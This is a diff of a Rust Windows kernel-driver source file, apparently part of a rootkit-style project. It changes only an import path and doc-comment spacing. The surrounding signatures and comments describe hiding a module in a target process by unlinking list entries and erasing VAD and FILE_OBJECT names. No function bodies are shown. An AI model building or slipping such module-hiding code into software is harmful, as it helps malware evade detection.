@@ -9,9 +9,9 @@ use {
         _MODE::KernelMode
     },
     crate::{
-        includes::{
+        internals::{
             structs::MMVAD_SHORT, vad::MMVAD, 
-            MmCopyVirtualMemory, PsGetProcessPeb
+            externs::{MmCopyVirtualMemory, PsGetProcessPeb}
         }, 
         process::Process, utils::{pool::PoolMemory, process_attach::ProcessAttach}
     }, 
@@ -30,11 +30,13 @@ impl Module {
     /// Enumerates modules in a given target process.
     /// 
     /// # Parameters
+    /// 
     /// - `process`: A pointer to the target process (`*mut TargetProcess`) from which the modules will be enumerated.
     /// - `module_info`: A pointer to a `ModuleInfo` structure that will be populated with information about the enumerated modules.
     /// - `information`: A mutable reference to a `usize` that will store additional information about the module enumeration.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the module enumeration is successful, otherwise returns an appropriate error status.
     ///
     pub unsafe fn enumerate_module(process: *mut TargetProcess, module_info: *mut ModuleInfo, information: &mut usize) -> Result<(), NTSTATUS> {
@@ -120,9 +122,11 @@ impl Module {
     /// Hides a module in a target process by removing its entries from the module list.
     ///
     /// # Parameters
+    /// 
     /// - `target`: A pointer to a `TargetModule` structure containing information about the module to be hidden.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the module is successfully hidden, otherwise returns an appropriate error status.
     ///
     pub unsafe fn hide_module(target: *mut TargetModule) -> Result<(), NTSTATUS> {
@@ -185,10 +189,12 @@ impl Module {
     /// Removing the module name in the FILE_OBJECT structure.
     ///
     /// # Parameters
+    /// 
     /// - `target_address`: The address of the module to hide.
     /// - `target_eprocess`: The target process structure.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the VAD is successfully hidden, otherwise returns an appropriate error status.
     ///
     pub unsafe fn hide_object(target_address: u64, target_eprocess: Process) -> Result<(), NTSTATUS> {
@@ -250,6 +256,7 @@ impl Module {
     /// Removes a link from the list.
     ///
     /// # Parameters
+    /// 
     /// - `list`: A mutable reference to the `LIST_ENTRY` structure to unlink.
     /// 
     unsafe fn remove_link(list: &mut LIST_ENTRY) {
